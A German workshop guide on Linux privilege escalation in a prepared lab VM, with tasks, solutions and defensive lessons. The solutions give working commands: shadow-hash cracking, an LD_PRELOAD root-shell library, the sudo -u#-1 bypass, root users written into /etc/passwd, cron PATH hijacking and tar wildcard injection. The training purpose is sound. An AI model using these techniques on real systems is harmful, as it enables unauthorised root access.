# I am root - Linux Privilege Escalation Workshop

## Einleitung
Herzlich Willkommen zu unserem Linux Privilege Escalation Workshop!

Wir befassen uns heute mit dem User- und Berechtigungensystem in Linux - insbesondere mit Fehlkonfigurationen die es uns erlauben, höhere Privilegien zu erschleichen. Dadurch lernen wir, was mögliche Einfallstore sind und wie wir sie vermeiden können.

In Capture the Flags ist die Ausgangssituation häufig die, dass man einen Zugang zu einem unprivilegierten User hat, bzw. diesen durch das Ausnutzen von Schwachstellen erlangt.
Dafür erhält man die erste Flagge, die User-Flag welche in der Regel im `home` Verzeichnis des Users liegt.

Die zweite Flagge ist die Root-Flag, welche sich im `/root` Verzeichnis befindet.
Das `/root` ist jedoch nur für einen User mit root-Rechten lesbar, also muss man diese auf irgendeine Art und Weiße erlangen.

Es gibt grundsätzlich viele Wege an dieses Ziel zu kommen. Capture the Flags sind oftmals thematisiert, und es gibt nur einen Weg. In unserem Workshop wollen wir jedoch mehrere Wege aufzeigen. Daher verzichten wir auf eine root-Flag, das ist nach der ersten ausgenutzten Schwachstelle witzlos.

Erfolgreich warst du, wenn die Shell ein `#`-Symbol zeigt, oder du auf den Befehl `id` mit der Ausgabe `uid=0(root) gid=0(root) groups=0(root)` belohnt wirst.

> **_Hinweis:_**  Wir fokusieren uns in diesem Workshop auf das Ausnutzen von Fehlkonfigurationen. Automatisierte Skripte und Exploits werden wir kurz vorstellen, jedoch nicht genauer betrachten.

Happy Hacking!

## Start
Wir haben für den Workshop eine Linux VM und einen Docker Container vorbereitet, beides kannst du verwenden.
Vorteil am Docker Container ist, dass er deutlich schmaler ist als die VM.

Nachteil am Docker Container ist, dass aufgrund seiner Natur nicht alle Workshop-Aufgaben bearbeitet werden können.
Das betrifft Cron Jobs und Docker selbst.

**Wenn es dir möglich ist, nutze bitte die VM - damit du alle Schwachstellen nachvollziehen kannst!**

### Virtuelle Maschine
- Installiere [VirtualBox](https://www.virtualbox.org/wiki/Downloads)
- Lade dir die VM aus [OneDrive](https://1drv.ms/u/s!AupinBFmdT3bhcJUDiXCJLH-ZisBgQ?e=rXGfZE) herunter
- Importiere die VM in VirtualBox über Datei => Appliance importieren
  - Optical Drive und USB Controller kannst du dabei deaktivieren
- Starte die VM  über das Kontextmenü (Rechtsklick => Start => Normaler Start) oder über den grünen Pfeil
  - Wenn du eine Fehlermeldung bzgl. USB-Controller oder Optical Drive erhälst, klicke sie einfach weg
- Du kannst auch deine lokale Konsole verwenden und via ssh auf die VM zugreifen (dann reicht auch der Headless Start)
  ```
  ssh -p 5678 john@127.0.0.1
  ```

### Vagrant
- Installiere Vagrant
- Baue die VagrantBox
  ```
  cd ./machines
  vagrant up
  ```
- ssh auf die Maschine
  ```
  vagrant ssh
  ```
- wechseln auf john
  ```
  su - john
  ```
- wenn du die Maschine resetten möchtest:
  ```
  vagrant destroy
  vagrant up
  ```

### Docker Container
- Installiere Docker (am einfachsten ist Docker Desktop, das ist Lizenztechnisch für unseren Workshop ok, aber für unseren Arbeitsalltag ❌ ohne Lizenz verboten)
  - alternativ funktioniert auch WSL2, Anleitungen gibts im Netz
- Baue dir aus dem Dockerfile im Repo das Image und starte den Container
  ```
  docker run --rm -it $(docker build -q ./machines)
  ```
- Alternativ, falls inline nicht funktioniert:
  ```
  docker build ./machines -t lpe/hacking:latest
  docker run --rm -it lpe/hacking:latest
  ```

Wenn du in der Konsole `whoami` eingibst und als Antwort `john` kommt bist du bereit für unser gemeinsames Abenteuer

> **_Hinweis:_**  Bei Problemen oder Fragen meldet euch bitte bereits vor dem Workshop bei uns, damit wir euch unterstützen können.
## Enumeration

### Manuell
Am Anfang steht immer die Recherche. Auf was für einem System befinde ich mich? Welche Linux Distribution, welche Kernel-Version?
Welche User sind noch auf diesem System angelegt?
Welche Dateien liegen hier so rum?
Mit diesen Infos lassen sich bspw. Kernel Exploits identifizieren, andere User übernehmen oder Passwörter finden.

#### System
- `hostname`
- `/etc/os-release`
- `uname -a`
- `/proc/version`
- `/etc/issue`

#### Programme und Prozesse
- `ps aux`
- `env`
- `sudo -l`
- `history`

#### User
- `id`
- `/etc/passwd`
- `/etc/shadow`

#### Dateien und Verzeichnisse
- `ls -la`
- `find /home -name passwords.txt` Datei “passwords.txt” im /home Verzeichnis
- `find / -type d -name config` Verzeichnis "config" unter “/”
- `find / -type f -perm 0777` Alle Dateien mit vollen Berechtiguneng für alle Benutzer
- `find / -perm a=x` Ausführbare Dateien
- `find /home -user debian` Dateien des Benutzers “debian” unter “/home”
- `find / -perm -o w -type d` Alle für alle Benutzer schreibbaren Verzeichnisse
- `find / -perm -u=s -type f` Alle Dateien mit gesetztem SUID Bit

> **_Tipp:_**  hängt man einem Kommando ` 2>/dev/null` an, so werden Fehlerausgaben ins digitale Nirvana umgeleitet. Dadurch bleibt die Konsole übersichtlicher.

### Automatisiert
Es gibt Skripte und Tools, welche einem die Enumeration abnehmen. Das kann sehr viel Zeit sparen, möglicherweise übersehen diese Tools allerdings etwas.
Oder sie finden etwas, das man selbst übersehen hat.

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

Zum auspobieren liegen die Skripte unter `/home/john/enum`.

## History File
Alle Befehle, welche in der Bash eingegeben wurden, werden im history file (`~/.bash_history`) gespeichert, auch Befehle die ein Passwort enthalten! Aus diesem Grund sollte man das Passwort wenn möglich nie als Parameter in einem Befehl mitgeben.

### Aufgabe
Findet heraus bei mit welchen Credentials sich der User `john` zuletzt bei Docker angemeldet hat.

### Lösung
```
history | grep login
```

### Lessons Learned
Nutzt wenn möglich `-stdin` um Passwörter einem Programm mitzugeben.
Sollte es gar nicht anders gehen, entfernt den Eintrag hinterher aus der History.

## Schwache Passwörter
Nicht jeder Anwender nutzt sichere Passwörter.
Man kann versuchen Passwörter anderer Anwender zu erraten, in der Hoffnung, dass sie weiterreichende Privilegien haben, als der eigene/aktuelle Nutzer.
Welche User auf einer Maschine angelegt sind, steht u.a. in der `/etc/passwd` Datei, welche für alle lesbar ist, bspw. mit `cat /etc/passwd`.
Einträge sehen bspw so aus:

```
john:x:998:998::/home/john:/bin/bash
```

Die Werte sind durch Doppelpunkte getrennt und stehen für
* User Name
* Verschlüsseltes Password (x: steht in der /etc/shadow Datei)
* User ID (UID)
* User Gruppen ID (GID)
* User voller Name
* User home Verzeichnis
* Login shell

Auf der Maschine gibt es noch einen User `debian`, kannst du das Passwort erraten?
Mit `su debian` kannst du den User auf `debian` wechseln.
Bringt uns der User weiter?

### Schwache Passwörter knacken
Passwörter der Benutzer-Accounts sind in der `/etc/shadow` Datei als (salted) hash abgelegt.
Diese Datei ist normalerweise nur mit root-Rechten lesbar.
Vielleicht ist dir bei der Enumeration bereits aufgefallen, dass die Datei auf dieser Maschine für alle lesbar ist? Autsch.

Mit bspw. `cat /etc/shadow` kannst du dir deshalb den Inhalt ausgeben lassen.
Der Inhalt ähnelt der `/etc/passwd` Datei.

```
debian:$1$qWQ7rZJN$/wJHoCHD.iJzxST88cgi2.:19311::::::
```

Der Passwort-Hash steht an der zweiten Stelle (nach dem User Namen) und ist der erweiterte Unix-Style `crypt(3)` Password Hash.
`$1$` identifiziert den für die Erstellung gewählten Hash-Typ, der zweite Teil `qWQ7rZJN`ist der Salt und der Teil nach dem dritte `$` ist der eigentliche Passwort Hash.

Wenn das Passwort ein schwaches ist, so besteht die Möglichkeit, dass man es mit einer sog. Wörterbuch-Attacke erraten kann.
Dazu werden aus den Einträgen einer Wortliste mit beliebten Passwörtern Hashes gebildet und mit dem hinterlegten Passwort-Hash abgeglichen.
Stimmen sie überein, so stimmt das Passwort mit dem Eintrag aus der Wortliste überein.

Zwei bekannte Programme zum ausführen von Wörterbuch-Attacks auf Passwort-Hashes sind Hashcat und John the Ripper.
Lass uns das Passwort des Users `debian` mit John the Ripper knacken! Auf der Maschine ist John the Ripper installiert und im home Verzeichnis von `john` eine Datei mit 100 beliebten Passwörtern `/home/john/top_100.txt`.

> **_Tipp:_**  Eine umfassende Sammlung von Wörterlisten für User, Passwörter, Verzeichnisse bietet [SecLists](https://github.com/danielmiessler/SecLists).

Für das knacken des Passworts müssen zwei Schritte durchgeführt werden:
1. Unshadowing der `/etc/shadow` Datei mit dem zu John the Ripper gehörendem Tool `unshadow`
2. Wörterliste-Attacke auf die Passwort-Hashes

### Aufgabe
Führe die oben genannten Schritte durch, um das Passwort zu knacken. Wie lautet es?

### Lösung
Unshadowing der `/etc/shadow` Datei. Wir schreiben das Ergebnis ein eine Datei `unshadowed` im Home-Verzeichnis unseres Users John.
```
unshadow /etc/passwd /etc/shadow > /home/john/unshadowed
```

Auf diese Datei wenden wir die Wörterbuch-Attacke mit unserer Passwortliste an.
```
john --wordlist=/home/john/top_100.txt /home/john/unshadowed
```

_pwned._

### Extra Aufgabe: Hashcat
Ein weiteres Tool zum cracken von Hashes ist wie bereits genannt Hashcat.
`hashcat -h` sagt uns, dass hashcat neben dem Hash und einem Wörterbuch einen Hash-Typ und eine Attack-Mode benötgt.

An der Struktur eines Hashes kann man erkennen, welche Hash-Funktion zum erzeugen genutzt wurde.
Tools unterstützen hierbei, bspw. [Hash Identifier](https://hashes.com/en/tools/hash_identifier).
Die Codes für den Hash-type findet man ebenfalls in der Hilfe, oder im [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes), dort sogar mit Beispiel-Hashes.

Als Attack Mode wählen wir "Straight" (entspricht einer Wörterbuch-Attacke).

```
hashcat -m <Hash-Type-Code> -a 0 <file with hashes> <dictionary file>
```

Optional können wir die Ergebnisse noch mit `-o` in eine Datei schreiben lassen.

Auf! Cracke das Passwort mit Hashcat!

### Lösung
Wir kopieren uns den Hash aus der `/etc/shadow` Datei in eine neue Datei, bspw. `/home/john/hash`.

[Hash Identifier](https://hashes.com/en/tools/hash_identifier) gibt uns als Hash-Typ `md5crypt` an.
Laut hashcat Hilfe bzw. wiki, ist der entsprechende Mode `500`.

```
hashcat -m 500 -a 0 /home/john/hash /home/john/top_100.txt
```

Hashcat cybert jetzt eine Weile und wir schauen interessiert zu.

Wenn hashcat fertig ist, kann man sich das Ergebnis mit `hashcat --show -m 500 /home/john/hash` ausgeben lassen.

### Lessons Learned
Schwache Passwörter (insbesondere solche die in Wörtlisten stehen könnten) sind absolut zu vermeiden! Kein Passwort sowieso. Auch Passwörter die sich erraten lassen sind nicht zu empfehlen.

## sudo
![comic; what's the magic word? answer: sudo](sudo.jpg)

Sudo erlaubt es einem Anwender Programme mit root-Rechten auszuführen. So kann ein Administrator einzelnen Anwendern die Möglichkeit geben trotz eingeschränktem Zugriff bestimmte Programme ausführen zu können.

Die Konfiguration ist in der Datei `/etc/sudoers` hinterlegt. Wenn du sie noch nicht kennst, schaue sie dir doch mal an, sobald du root-Rechte erlangt hast. Du könntest `john` dann sogar noch weiterführende Rechte gewähren.

> **_Hinweis:_**  Die sudoers Datei bearbeitet man am besten mit visudo, welches eine Syntaxprüfung auf die Datei ausführt. Wenn die Datei kaputt ist, kann es unter Umständen dazu führend, dass man keine root-Rechte mehr auf diesem System erlangen kann.

Welche Programme für den angemeldeten User in sudo konfiguriert sind erfährt man mit dem `sudo -l` Befehl.

Bei einigen Programmen gibt es die Möglichkeit, Dateien zu lesen oder eine shell zu spawnen - und wenn das Programm mit root-Rechten ausgeführt wurde, Dateien mit root Lesezugriff (bspw. /etc/shadow) zu lesen/schreiben oder eine root-shell zu spawnen.
Eine Sammlung dieser Programme und wie man diese Schwachstelle ausnutzt bietet [gtfobins](https://gtfobins.github.io/).

### Aufgabe
Schau doch mal mit `sudo -l`, welche Programme `john` mit für sudo konfiguriert sind.
Such nach diesen Programmen auf [gtfobins](https://gtfobins.github.io/) und spiele ein bisschen mit ihnen herum.
Schaffst du es es, root-Rechte zu erlangen?

### LD_PRELOAD
LD_PRELOAD erlaubt es Programmen, geteilte Bibliotheken (sog. shared objects) zu verwenden. Wenn die `env_keep` Option aktiviert ist, können wir eine geteilte Bibliothek erstellen und einem Programm welches wir mit sudo aufrufen mitgeben. Die Biblothek wird dann zuerst ausgeführt. Bspw. könnte so eine Bibliothek eine root-shell spawnen.

Dieser C-Code spawned eine root-shell:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Der Code lässt sich zu einem shared object kompilieren:

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles -w
```

Und beim Aufruf eines Programms mit root-Rechten mitgeben.

```
sudo LD_PRELOAD=/home/john/shell.so find
```

### CVE-2019-14287
Sudo erlaubt es auch mit `sudo -u#<id> <command>` einen Befehl mit einem bestimmten User auszuführen. Dazu muss der User jedoch die Berechtigung haben.
Mit `sudo -u#0 whoami` würde whoami mit root Rechten aufgerufen (die ID des root Users ist 0), sofern der aufrufende User die Berechtigung hat, whoami als root aufzurufen.
Bis sudo in der Version < 1.8.28 existierte ein Bug, welcher in Kombination mit einer Misskonfiguration erlaubte ein Programm mit root-Rechten auszuführen, wobei dies explizit in der Konfiguration ausgeschlossen wurde.
Die Konfiguration sieht folgendermaßen aus und erlaubt das ausführen des Programmes (oder aller Programme) als jeder andere User als root:

```
<user> ALL=(ALL:!root) NOPASSWD: ALL
```

Wenn der unpreviligierte User nun den Befehl mit der id `-1` aufruft, interpretiert sudo das als `0`, die Konfiguration zieht jedoch trotzdem nicht an, weil `-1` eben nicht die id von `root` ist.

#### Aufgabe
Spawne eine root-Shell.

#### Lösung
```
sudo -u#-1 bash
```

### Lessons Learned
Geh sparsam um mit sudo-Berechtigungen.
Prüfe Binaries vorher auf [gtfobins](https://gtfobins.github.io/) ob sie Privilege Escalation oder das Bearbeiten geschützter Dateien erlauben.
Aktiviere nicht die `env_keep` Option, wenn es nicht absolut nötig ist.
Halte dein System aktuell.

## SUID/SGID

### Exkurs: Linux Berechtigungen
Berechtigungen steuern, ob ein User eine Datei lesen, schreiben oder ausführen darf hängen an den Dateien selbst. Mit dem Befehl `ls -l` kann man sich diese Berechtigungen anzeigen lassen.

```
#ls -l
  drwxr-xr-x   4   john  user     128 B     Wed Sep 21 15:15:52 2022   docker/
  -rw-r-----   1   john  user       4 KiB   Wed Sep 21 16:52:10 2022   lpe_workshop.md
```
Das erste Zeichen identifiziert Dateien `-`und Verzeichnisse `d`.
Die Berechtigungen stehen danach als 3er-Blöcke für jeweils lesen, schreiben, ausführen.

Davon gibt es jeweils drei Blöcke: Besitzer, Gruppe, Jeder.
`r` steht für lesen, `w` für schreiben und `x` für ausführen. `-`bedeutet keine Berechtigung an dieser Stelle.

Im Beispiel oben hat der User `john` für die Datei `lpe_workshop.md` die Berechtigungen lesen und schreiben, da er Besitzer ist. Die Gruppe `user` darf lesen und alle anderen User dürfen gar nichts.

Der root User darf grundsätzlich alles (deshalb sind wir so heiß auf ihn).

## SUID/SGID Bit
Manchmal sieht man im Besitzer- oder Gruppenblock einer Datei anstelle des `x` ein `s`. Das ist dann das SUID-, bzw. SGID-Bit. Es besagt, dass diese Datei mit den Rechten des Besitzers, bzw. mit den der Gruppe. Im Beispiel unten ist das Programm passwd mit dem SUID Bit versehen, denn ein normaler User soll es ausführen können, um sein Passwort zu ändern, aber dafür muss eine geschützte Datei bearbeitet werden (`/etc/shadow`), die er sonst nicht bearbeiten darf.

```
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
```

Dateien die mit dem SUID-/ SGID-Bit lassen sich mit dem `find` Befehl aufspüren:

```
find / -perm -u=s -user root 2>/dev/null
find / -perm -g=s -group root 2>/dev/null
```

### Exploit
Wie hilft uns das, root Rechte auf einer Maschine zu erlangen?
Auf [gtfobins](https://gtfobins.github.io/) kann man die Programme auf SUID filtern.

Aus manchen Programmen kann man bei gesetztem SUID/SGID Flag ausbrechen und und eine root-Shell spawnen. Wenn das SUID-/SGID-Bit auf einem Editor gesetzt ist, kann man alternativ auch die `/etc/passwd` Datei bearbeiten und eine neuen User mit root-Rechten anlegen.

### Aufgabe
Finde Dateien mit SUID/SGID-Bit und versuche root-Rechte zu erlangen.

### Lösung
Wir schauen, welche Dateien das SUD Bit gesetzt haben.

```
find / -perm -u=s -user root 2>/dev/null
```

In der Liste finden wir einen Editor (nano).
Damit können wir die schreibgeschützte ˙/etc/passwd` Datei editieren.

Wir erzeugen dafür einen Passwort-Hash.

```
openssl passwd -1 -salt foo password123
$1$foo$yKXUGOo1ZIgTvE6smA/W//
```

Wir fügen mit nano einen neuen User mit dem generierten Passwort-Hash in die `/etc/passwd` Datei ein.

```
jane:$1$foo$yKXUGOo1ZIgTvE6smA/W//:0:0:root:/root:/bin/bash
```

Oder ein bisschen einfacher: Wir spawnen eine root-Shell mit agetty (gefunden auf [gtfobins](https://gtfobins.github.io/gtfobins/agetty/)):

```
agetty -o -p -l /bin/sh -a root tty
```

Mit dem Befehl `su jane` können wir auf den neuen User wechseln - und haben eine root-shell.

### Lessons Learned
Durchsuche dein System mit den o.g. `find` Befehlen, welche Programme das Sticky-Bit gesetzt haben und prüfe auf [gtfobins](https://gtfobins.github.io/), ob das ausgenutzt werden kann.

## Capabilities

Capabilities sind eine Möglichkeit Rechte feingranularer zu vergeben. Wenn der Admin dem User keine erweiterten Rechte geben möchte kann er einem Tool einzelne Berechtigungen geben. Dadurch kann der User das Tool nutzen und bekommt keine Berechtigungsfehler, hat aber selbst keine erweiterten Rechte.

Mit dem Befehl `getcap` lassen sich Executables mit erweiterten Capabilities aufspüren (um die Ausgabe kompakt zu halten werfen wir die Fehlerausgaben weg `2>/dev/null`).

```
getcap -r / 2>/dev/null
```

[gtfobins](https://gtfobins.github.io/) hilft euch auch bei Capabilities weiter.

### Aufgabe

Findet eine Datei mit gesetzten Capabilities und den passenden Exploit auf [gtfobins](https://gtfobins.github.io/).

### Lösung

```
getcap -r / 2>/dev/null
```

Damit finden wir die Kopie von vim unter /home/john/vim mit erweiterten Rechten.

Auf [gtfobins](https://gtfobins.github.io/gtfobins/vim/) finden wir eine Möglichkeit wie wir uns mit vim und dieser Capability root-Rechte holen können.

```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

Damit setzt vim für sich selbst die uid auf 0 (root) und startet mit diesen Rechten eine Shell.

### Lessons Learned
Durchsuche dein System mit `getcap`, welche Programme Capabilitites haben und prüfe auf [gtfobins](https://gtfobins.github.io/), ob das ausgenutzt werden kann.

## CronJobs
Cron Jobs erlauben es, Programme oder Skripte zu bestimmten Zeiten automatisiert ausführen zu lassen.
Diese Jobs werden in einer Datei gespeichert, `/etc/crontab` welche standardmäßig nur mit root-Rechten bearbeitbar ist. Was die Zahlen und Sterne bedeuten erklärt bspw. [crontab.guru](https://crontab.guru/). Anzeigen lassen können wir sie bspw. mit `cat /etc/crontab`. Ausgeführt werden diese Jobs dann vom Cron-Daemon und zwar mit den Rechten des Besitzers der Datei.

> **_Hinweis:_**  Cron läuft aufgrund der "Ein Prozess pro Container"-Richtlinie nicht wirklich gut in Docker.
> Das Beispiel kann deshalb im Docker Container nicht nachgestellt werden. Trotzdem sollten Enum Skripte diese Miskonfiguration erkennen.

### Pfad-Variable
Am Anfang der Cron Tabelle ist zum einen die Shell definiert, welche Cron verwendet. Zum anderen wird eine Pfad-Variable definiert, in welcher Cron nach ausführbaren Dateien sucht, wenn ihr Aufruf nicht mit vollqualifiziertem Pfad erfolgt. Die Reihenfolge ist dabei von links nach rechts.

Etwas weiter unten ist der Job `backup_root.sh` definiert. Wie wir sehen ist der Aufruf nicht mit vollqualifiziertem Pfad.

Wenn wir wissen wollen, wo backup_root.sh liegt, können wir das mit dem `find` Befehl herausfinden.

```
find / -name backup_root.sh 2>/dev/null
/bin/backup_root.sh
```

#### Aufgabe
Wenn wir ein Skript mit gleichem Namen in einem Verzeichnis hätten, welches vor `/bin` durchsucht wird, dann würde diese Datei ausgeführt, anstatt der Datei `/bin/backup_root.sh`. Und dieses Skript würde dann machen, was wir wollen.

Hätte, würde, könnte.. Mach es!

#### Lösung
In der Pfad-Variable in der crontab steht als erstes das Verzeichnis `/scripts`. Dieses Verzeichnis ist zu unserem Glück für alle schreibbar. Das bedeudet, wir können dort ein Skript `backup_root.sh` ablegen und es wird von Cron ausgeführt, anstelle jenem im `/bin`-Verzeichnis.

Wir nutzen dafür das vorhin kennengelernte SUID Bit aus.
Dafür kopieren wir uns im Backup-Script die bash an eine andere Stelle und setzen das SUID Bit.

```
echo 'cp /bin/bash /scripts/bash; chmod +s /scripts/bash' > /scripts/backup_root.sh
```

Wenn wir die kopierte bash mit dem Argument "-p" starten, behält sie ihre Privilegien und wir haben eine root-Shell.

Alternativ können wir uns in der `/scripts/backup_root.sh` auch einen User mit root Rechten anlegen lassen.

```
#!/bin/sh
JANE='jane:\$1\$iteratec\$45qXWta7eRNhUghQ4Uu8q/:0:0:root:/root:/bin/bash'
sed -n "\|$JANE|q;\$a $JANE" /etc/passwd >> /etc/passwd
```

### Schwache Datei-Berechtigungen
Mit `cat /etc/crontab` sehen wir in der Cron Tabelle u.a. das Skript backup_home.sh. Wir können uns mit `ls -la` die Berechtigungen dieses Skripts ansehen:

```
-rwxr-xrwx 1 root root 61 Nov 14 10:43 /etc/backup_home.sh
```

Wir sehen, dass jeder User diese Datei bearbeiten kann. Das ist schlecht. Also gut. Gut für uns!

#### Aufgabe
Dass wir das Skript bearbeiten können sollten wir ausnutzen.
Ändere das Skript so um, dass es tut was du willst - mit root-Rechten!

#### Lösung
Wir können uns hier wieder die bash kopieren, mit SUID-Bit ausstatten und mit dem Argument `-p` ausführen, oder alernativ wieder einen neuen User mit root Rechten in der `/etc/passwd` Datei anlegen.

### Wildcard Injection
In der Cron Tabelle gibt es einen weiteren interessanten Job, welcher mit root-Rechten läuft: `archive_john.sh`.
Das Skript erstellt mit tar ein Archiv aller Dateien in `/home/john` und speichert es als `/backup/john.tgz`. Dafür nutzt es das Wildcard `*` um alle Dateien im Verzeichnis `/home/john` dem Archiv hinzuzufügen.

Im [tar-Bereich auf gtfobins](https://gtfobins.github.io/gtfobins/tar/) sehen wir, dass `tar` mit Argumenten aufgerufen werden kann, um einen Shell zu spawnen.
Wenn `tar` mit root-Berechtigung aufgerufen wird, werden diese Berechtigungen nicht verworfen und wir haben eine root-Shell.

Aber wie bekommen wir die Argumente in `tar`? Das Skript selbst ist leider nur vom Besitzer beschreibbar. Hier kommt das Wildcard ins Spiel. Wenn tar eine Datei dem Archiv hinzufügen möchte und der Dateiname wie ein Argument aussieht, wird es als Argument interpretiert.

#### Aufgabe
Injecte die benötigten Argumente in `tar`, um eine root-Shell zu erhalten.

#### Lösung
Erzeuge im `/home/john` Verzeichniss ein Script welches uns wieder die bash kopiert und mit SUID-Bit versieht.

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/john/rootshell.sh
```

Außerdem erstelle die beiden Argumente als Dateien im `home/john` Verzeichnis

```
echo "" > "--checkpoint-action=exec=sh rootshell.sh"
echo "" > --checkpoint=1
```

Das Kommando welches im Skript durch den Cron Job aufgerufen wird sieht dann folgendermaßen aus:

```
tar cf /backups/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh rootshell.sh
```

- checkpoint[=x] - Nutze “checkpoints”: Zeige eine Fortschrittsmeldung alle x Einträge an
- checkpoint-action=ACTION: Führe ACTION an jedem checkpoint aus, in unserem Fall exec
- exec=COMMAND: Führe das COMMAND aus, in unserem Fall das Skript welche die Shell kopiert und mit SUID-Bit versieht

Wenn der Job das nächste mal gelaufen ist, sollte `/tmp/bash -p` eine root-Bash spwanen.

### Lessons Learned
Prüfe die Jobs, welche du konfiguriert hast.
- Werden sie mit root-Rechten ausgeführt?
- Sind Verzeichnisse im Pfad, welche nicht nur von root beschrieben werden können?
- Werden in Skripten Wildcards verwendet und kann das ausgenutzt werden?

## Kernel Exploits
Wenn ein System nicht auf den atuellsten Stand ist, ist der Kernel ggf. anfällig für einen Kernel Exploit. Finden lassen sie sich entweder mit einem Tool/Skript (bspw. [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) oder mit metasploits Modul local_exploit_suggester) oder durch google Kernel Version + exploit und Datenbanken wie bspw. [Exploit-DB](https://www.exploit-db.com/).

### Lessons Learned
Auch wenn wir das jetzt nicht ausprobiert haben sollte klar sein: halte dein System aktuell!

## Und jetzt?
Du hast Blut geleckt und möchtest gerne mehr zu Linux Privilege Escalation, Hardening & Co. erfahren und machen?
Hier ein paar Ressourcen zum Thema, damit dir zum Ende des Jahres nicht langweilig wird:

### Lesen
- [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Ethical Hacking Notes](https://enotes.nickapic.com/Linux-Priv-Esc-285bbed8681645c38c32a6952f4e52af)
- [Resourcensammlung](https://github.com/Aksheet10/Cyber-security-resources#linux)

### Lernen und CTFs
- [tryhackme](https://tryhackme.com) bietet eine Menge CTFs, bei denen LPE oft eine Rolle spielt (wir haben auch eine iteratec Organisation, welcher du zugeordnet wirst, wenn du dich mit deiner iteratec Email Adresse registrierst)
- [hackthebox](https://app.hackthebox.com/home)
- [hackthebox Academy](https://academy.hackthebox.com/paths) hat einen Local PE Lernpfad
- [Linksammlung](https://razvioverflow.github.io/starthacking) für Lernen & CTFs
